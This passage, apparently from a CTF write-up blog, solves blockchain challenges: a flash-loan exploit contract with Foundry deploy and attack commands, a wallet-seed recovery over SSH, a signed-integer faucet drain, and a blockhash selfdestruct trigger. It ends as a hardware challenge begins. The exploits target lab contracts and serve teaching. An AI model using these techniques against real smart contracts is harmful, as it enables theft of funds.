</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">TOKEN</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span> <span class="o">==</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">,</span> <span class="s">&#34;AAA&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Trigger flashLoan, later give back the loaned money via deposit
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">TARGET</span><span class="p">.</span><span class="n">flashLoan</span><span class="p">(</span><span class="n">IERC3156FlashBorrower</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span> <span class="kt">address</span><span class="p">(</span><span class="n">TOKEN</span><span class="p">),</span> <span class="mi">10</span> <span class="kc">ether</span><span class="p">,</span> <span class="kt">bytes</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Now, we can easily withdraw and get free money :)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">TARGET</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="mi">10</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">onFlashLoan</span><span class="p">(</span><span class="kt">address</span> <span class="n">initiator</span><span class="p">,</span> <span class="kt">address</span> <span class="n">token</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">fee</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">calldata</span> <span class="nb">data</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bytes32</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// At this stage, we already have the loaned money
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// Deposit it back to the pool
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">TOKEN</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">TARGET</span><span class="p">),</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">TARGET</span><span class="p">.</span><span class="n">deposit</span><span class="p">(</span><span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Transfer the fee
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">TOKEN</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">TARGET</span><span class="p">),</span> <span class="n">fee</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;ERC3156FlashBorrower.onFlashLoan&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>To deploy and execute this exploit using Foundry:</p>
<ul>
<li>Initialize a new Foundry project with <code>forge init</code>.</li>
<li>Copy all challenge contracts into the <code>src/</code> directory.</li>
<li>Create <code>Exploit.sol</code> inside <code>src/</code>, incorporating the exploit code.</li>
<li>Use <code>forge</code> to deploy the exploit contract.
<ul>
<li>Execute <code>forge create ./src/Exploit.sol:Exploit --rpc-url &lt;rpc_url&gt; --private-key &lt;private_key&gt; --constructor-args &lt;setup_address&gt;</code> to deploy.</li>
</ul>
</li>
<li>Transfer <code>1 ether</code> of your <code>TOKEN</code> to the deployed contract.
<ul>
<li>Obtain the <code>TOKEN</code> address with <code>cast call &lt;setup_address&gt; &quot;TOKEN()&quot; -r &lt;rpc_url&gt;</code>.</li>
<li>Transfer <code>1 ether</code> to the exploit contract using <code>cast send &lt;token_address&gt; &quot;transfer(address,uint256)&quot; -r &lt;rpc_url&gt; --private-key &lt;private_key&gt; -- &lt;exploit_address&gt; 1000000000000000000</code>.</li>
</ul>
</li>
<li>Trigger the <code>attack</code> function on the deployed contract.
<ul>
<li>Use <code>cast send &lt;exploit_address&gt; &quot;attack()&quot; -r &lt;rpc_url&gt; --private-key &lt;private_key&gt;</code>.</li>
</ul>
</li>
</ul>
<p>Following these steps should successfully exploit the vulnerability and retrieve the flag.</p>
<blockquote>
<p><strong>Flag: HTB{7H1nk_r0Und1ng_D1reC710N_7W1Ce}</strong></p></blockquote>
<h2 id="recovery-easy">Recovery [easy]</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">We are The Profits. During a hacking battle our infrastructure was compromised as were the private keys to our Bitcoin wallet that we kept.
We managed to track the hacker and were able to get some SSH credentials into one of his personal cloud instances, can you try to recover my Bitcoins?
Username: satoshi
Password: L4mb0Pr0j3ct
NOTE: Network is regtest, check connection info in the handler first.</div>
        </div>
    </div>
<h3 id="initial-analysis-1">Initial Analysis</h3>
<p>We didn&rsquo;t receive any files directly, but upon launching a Docker instance, we were provided with three pairs of IP addresses and ports. Connecting via <code>netcat</code> to the third pair revealed instructions for our task: we need to access a hacker&rsquo;s wallet and transfer all the money to a designated address.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc 94.237.56.255 48197
</span></span><span class="line"><span class="cl">Hello fella, help us recover our bitcoins before it&#39;s too late.
</span></span><span class="line"><span class="cl">Return our Bitcoins to the following address: bcrt1ql97nl7ph725kpqd4yuztnasa5chnf70y3775wk
</span></span><span class="line"><span class="cl">CONNECTION INFO:
</span></span><span class="line"><span class="cl">  - Network: regtest
</span></span><span class="line"><span class="cl">  - Electrum server to connect to blockchain: 0.0.0.0:50002:t
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">NOTE: These options might be useful while connecting to the wallet, e.g --regtest --oneserver -s 0.0.0.0:50002:t
</span></span><span class="line"><span class="cl">Hacker wallet must have 0 balance to earn your flag. We want back them all.
</span></span></code></pre></td></tr></table>
</div>
</div><p>Next, we proceeded by connecting to the first IP and port pair using <code>ssh</code>, with the hacker&rsquo;s SSH credentials as indicated. This connection allowes us to read the wallet seed, crucial for taking control of the hacker&rsquo;s wallet.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">satoshi@ng-team-51812-blockchainrecoveryca2024-uqfrf-75d8d97989-mrzzp   ~ ls
</span></span><span class="line"><span class="cl">wallet
</span></span><span class="line"><span class="cl">satoshi@ng-team-51812-blockchainrecoveryca2024-uqfrf-75d8d97989-mrzzp   ~ ls wallet
</span></span><span class="line"><span class="cl">electrum-wallet-seed.txt
</span></span><span class="line"><span class="cl">satoshi@ng-team-51812-blockchainrecoveryca2024-uqfrf-75d8d97989-mrzzp   ~ cat wallet/electrum-wallet-seed.txt
</span></span><span class="line"><span class="cl">harsh hungry raccoon leg segment habit afford spice kangaroo version woman tuna
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="solution-1">Solution</h3>
<p>With the wallet seed in hand, our next step was to install <code>electrum</code>. The installation process is straightforward:</p>
<ul>
<li>Download the Electrum package using <code>wget https://download.electrum.org/4.5.3/Electrum-4.5.3.tar.gz</code></li>
<li>Install Electrum with <code>pip install --user Electrum-4.5.3.tar.gz</code></li>
<li>Start Electrum, ensuring it connects to the second IP and port pair we received:
<ul>
<li><code>electrum --regtest --oneserver -s 94.237.56.255:57370:t</code></li>
</ul>
</li>
</ul>
<p>After initiating Electrum, we imported the wallet using the seed we had found earlier.
<img src="https://i.imgur.com/AW3gOUI.png"/></p>
<p>This granted us access to the hacker&rsquo;s wallet, from which we could then transfer all the money to the specified address.
<img src="https://i.imgur.com/32i2hSN.png"/></p>
<p>Finally, to complete our task, we reconnected to the first IP and port pair using <code>netcat</code> to retrieve the flag.</p>
<blockquote>
<p><strong>Flag: HTB{n0t_y0ur_k3ys_n0t_y0ur_c01n5}</strong></p></blockquote>
<h2 id="lucky-faucet-easy">Lucky Faucet [easy]</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">The Fray announced the placement of a faucet along the path for adventurers who can overcome the initial challenges. It&rsquo;s designed to provide enough resources for all players, with the hope that someone won&rsquo;t monopolize it, leaving none for others.</div>
        </div>
    </div>
<h3 id="initial-analysis-2">Initial Analysis</h3>
<p>We were provided with two smart contracts: <code>Setup.sol</code> and <code>LuckyFaucet.sol</code>. Let&rsquo;s begin with an overview of <code>Setup.sol</code></p>
<p><strong>Setup.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">LuckyFaucet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./LuckyFaucet.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Setup</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">LuckyFaucet</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">TARGET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">constant</span> <span class="n">INITIAL_BALANCE</span> <span class="o">=</span> <span class="mi">500</span> <span class="kc">ether</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">TARGET</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LuckyFaucet</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">INITIAL_BALANCE</span><span class="p">}();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="n">TARGET</span><span class="p">).</span><span class="nb">balance</span> <span class="o">&lt;=</span> <span class="n">INITIAL_BALANCE</span> <span class="o">-</span> <span class="mi">10</span> <span class="kc">ether</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The challenge begins by depositing <code>500 ether</code> into the <code>LuckyFaucet</code> contract upon its deployment. Our objective is to reduce the <code>balance</code> of <code>LuckyFaucet</code> to <code>490 ether</code> or less. Now, let&rsquo;s delve into the <code>LuckyFaucet</code> contract.</p>
<p><strong>LuckyFaucet.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">LuckyFaucet</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int64</span> <span class="k">public</span> <span class="n">upperBound</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int64</span> <span class="k">public</span> <span class="n">lowerBound</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// start with 50M-100M wei Range until player changes it
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">upperBound</span> <span class="o">=</span> <span class="mi">100</span><span class="n">_000_000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">lowerBound</span> <span class="o">=</span>  <span class="mi">50</span><span class="n">_000_000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setBounds</span><span class="p">(</span><span class="kt">int64</span> <span class="n">_newLowerBound</span><span class="p">,</span> <span class="kt">int64</span> <span class="n">_newUpperBound</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">_newUpperBound</span> <span class="o">&lt;=</span> <span class="mi">100</span><span class="n">_000_000</span><span class="p">,</span> <span class="s">&#34;100M wei is the max upperBound sry&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">_newLowerBound</span> <span class="o">&lt;=</span>  <span class="mi">50</span><span class="n">_000_000</span><span class="p">,</span>  <span class="s">&#34;50M wei is the max lowerBound sry&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">_newLowerBound</span> <span class="o">&lt;=</span> <span class="n">_newUpperBound</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// why? because if you don&#39;t need this much, pls lower the upper bound :)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// we don&#39;t have infinite money glitch.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">upperBound</span> <span class="o">=</span> <span class="n">_newUpperBound</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">lowerBound</span> <span class="o">=</span> <span class="n">_newLowerBound</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">sendRandomETH</span><span class="p">()</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">,</span> <span class="kt">uint64</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int256</span> <span class="n">randomInt</span> <span class="o">=</span> <span class="kt">int256</span><span class="p">(</span><span class="nb">blockhash</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">number</span> <span class="o">-</span> <span class="mi">1</span><span class="p">));</span> <span class="c1">// &#34;but it&#39;s not actually random &#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// we can safely cast to uint64 since we&#39;ll never 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// have to worry about sending more than 2**64 - 1 wei 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint64</span> <span class="n">amountToSend</span> <span class="o">=</span> <span class="kt">uint64</span><span class="p">(</span><span class="n">randomInt</span> <span class="o">%</span> <span class="p">(</span><span class="n">upperBound</span> <span class="o">-</span> <span class="n">lowerBound</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">lowerBound</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">        <span class="kt">bool</span> <span class="n">sent</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">.</span><span class="nb">send</span><span class="p">(</span><span class="n">amountToSend</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">sent</span><span class="p">,</span> <span class="n">amountToSend</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Upon examining the contract, we find two functions of interest: <code>setBounds</code> and <code>sendRandomETH</code>. The <code>sendRandomETH</code> function attempts to transfer an <code>amountToSend</code> in ether to the caller, with the amount being determined within the bounds of <code>lowerBound + (upperBound - lowerBound + 1)</code>. It&rsquo;s important to note that <code>1 ether</code> equals <code>10**18</code>, making the initial bounds (<code>5*10**7</code> to <code>10**8</code>) significantly smaller by comparison. Thus, extracting <code>10 ether</code> (or <code>10**19</code>) using the initial bounds would be impractically slow. Based on this, we need to think a solution on how to make this faster.</p>
<h3 id="solution-2">Solution</h3>
<p>However, we observe that both <code>upperBound</code> and <code>lowerBound</code> are signed integers (<code>int64</code>), allowing us to set a large negative value for <code>lowerBound</code> through <code>setBounds</code>.</p>
<p>By assigning a substantially negative value to <code>lowerBound</code>, we can achieve a large <code>amountToSend</code>. Even if the result of <code>randomInt % (upperBound - lowerBound + 1) + lowerBound</code> is negative, it will be cast to <code>uint64</code>, resulting in a substantial <code>amountToSend</code>.</p>
<p>To overcome this challenge, we can simply set the bounds to a significantly negative number and then invoke <code>sendRandomETH</code>. This approach will enable us to drain more than <code>10 ETH</code>. Here&rsquo;s the solution utilizing <code>foundry cast</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cast send &lt;target_address&gt; &#34;setBounds(int64,int64)&#34; -r &lt;rpc_url&gt; --private-key &lt;private_key&gt; -- -1000000000000000000 100000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">cast send &lt;target_address&gt; &#34;sendRandomETH()&#34; -r &lt;rpc_url&gt; --private-key &lt;private_key&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><strong>Flag: HTB{1_f0rg0r_s0m3_U}</strong></p></blockquote>
<h2 id="russian-roulette-very-easy">Russian Roulette [very easy]</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Welcome to The Fray. This is a warm-up to test if you have what it takes to tackle the challenges of the realm. Are you brave enough?</div>
        </div>
    </div>
<h3 id="initial-analysis-3">Initial Analysis</h3>
<p>We were given two smart contracts: <code>Setup.sol</code> and <code>RussianRoulette.sol</code>. Let&rsquo;s start by examining the <code>Setup.sol</code>.</p>
<p><strong>Setup.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">23</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">RussianRoulette</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./RussianRoulette.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Setup</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">RussianRoulette</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">TARGET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">TARGET</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RussianRoulette</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">10</span> <span class="kc">ether</span><span class="p">}();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="n">TARGET</span><span class="p">).</span><span class="nb">balance</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Upon inspecting the code, we find that the initial setup involves depositing <code>10 ether</code> into the <code>RussianRoulette</code> contract. Our objective is to reduce the <code>balance</code> of the <code>RussianRoulette</code> contract (referred to as <code>TARGET</code>) to <code>0</code>. Now, let&rsquo;s turn our attention to <code>RussianRoulette.sol</code>.</p>
<p><strong>RussianRoulette.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">23</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">RussianRoulette</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// i need more bullets
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">pullTrigger</span><span class="p">()</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">string</span> <span class="k">memory</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="nb">blockhash</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">number</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">%</span> <span class="mi">10</span> <span class="o">==</span> <span class="mi">7</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">selfdestruct</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">));</span> <span class="c1">// 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="s">&#34;im SAFU ... for now&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This contract features a single function named <code>pullTrigger()</code>. If <code>(uint256(blockhash(block.number - 1)) % 10 == 7)</code> evaluates to true, the contract executes <code>selfdestruct</code>. This action transfers the contract&rsquo;s remaining balance to a specified address, in this case, the caller of <code>pullTrigger</code>.</p>
<p>Each new transaction invoking <code>pullTrigger</code> can produce new <code>block.number</code>, implying that eventually, the condition within the <code>if</code> statement will be met, triggering the action.</p>
<h3 id="solution-3">Solution</h3>
<p>Based on this analysis, we can repeatedly call <code>pullTrigger()</code> until the <code>selfdestruct</code> is activated. Here&rsquo;s an example command for invoking <code>pullTrigger()</code> using <code>foundry cast</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cast send &lt;target_address&gt; &#34;pullTrigger()&#34; -r &lt;rpc_url&gt; --private-key &lt;private_key&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><strong>Flag: HTB{99%_0f_g4mbl3rs_quit_b4_bigwin}</strong></p></blockquote>
<h1 id="hardware">Hardware</h1>
<h2 id="flash-ing-logs-hard">Flash-ing Logs [hard]</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">After deactivating the lasers, you approach the door to the server room. It seems there&rsquo;s a secondary flash memory inside, storing the log data of every entry. As the system is air-gapped, you must modify the logs directly on the chip to avoid detection. Be careful to alter only the user_id = 0x5244 so the registered logs point out to a different user. The rest of the logs stored in the memory must remain as is.</div>
        </div>
    </div>
<h3 id="initial-analysis-4">Initial Analysis</h3>
<p>In this challenge, we were provided with <code>client.py</code> to interact with flash memory, alongside a C file named <code>log_event.c</code>.</p>
<p><strong>log_event.c</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
